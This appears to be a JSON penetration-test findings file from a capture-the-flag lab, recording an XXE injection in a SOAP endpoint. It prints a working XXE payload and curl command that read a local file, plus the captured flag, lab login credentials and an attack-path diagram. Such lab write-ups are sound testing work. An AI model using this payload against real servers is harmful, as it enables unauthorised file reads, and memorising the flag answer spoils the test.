@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:31:13.065610+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "0d79a1ce-c1fc-40fd-81e6-17a5a3889cca",
+      "timestamp": "2026-04-12T21:31:13.065517+00:00",
+      "title": "XXE Injection in SOAP Service \u2014 Arbitrary File Read",
+      "severity": "critical",
+      "target": "http://172.17.0.1:55807/soap_service",
+      "description": "The /soap_service endpoint parses XML input without disabling external entity processing (XXE). An authenticated attacker can inject a DOCTYPE declaration with a SYSTEM entity referencing local files. The server resolves and returns the file content in the XML response, enabling arbitrary file read on the server.",
+      "evidence": "Request:\nPOST /soap_service HTTP/1.1\nContent-Type: application/xml\nCookie: session=eyJ1c2VybmFtZSI6ImpvaG4ifQ...\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/flag.txt\">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>\n\nResponse:\n<GetAccountInfoResponse>\n  <account_id>flag{0abbab82-7e17-488e-8c06-c413564d6d4a}</account_id>\n  <balance>1000 USD</balance>\n  ...\n</GetAccountInfoResponse>\n\nCTF FLAG: flag{0abbab82-7e17-488e-8c06-c413564d6d4a}",
+      "tool_used": "manual/curl",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -si -b 'session=<john-session>' -X POST http://172.17.0.1:55807/soap_service -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/flag.txt\">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'",
+        "expected": "Flag content returned in <account_id> element"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "26f7a7e5-53e1-4dc9-9e8f-55487d5cc586",
+      "timestamp": "2026-04-12T21:31:24.098794+00:00",
+      "title": "Attack Path - CTF Flag Extraction",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker\"] --> Login[\"/login POST john:password123\"]\n  Login --> Session[\"Session Cookie - username=john\"]\n  Session --> Dashboard[\"/dashboard GET\"]\n  Dashboard --> SOAP[\"/soap_service POST XML\"]\n  SOAP --> XXE[\"XXE DOCTYPE Entity SYSTEM file:///app/flag.txt\"]\n  XXE --> Flag[\"flag{0abbab82-7e17-488e-8c06-c413564d6d4a}\"]\n  \n  style Flag fill:#ff4444,color:#fff\n  style XXE fill:#ff8800,color:#fff"
+    }
+  ]
+}
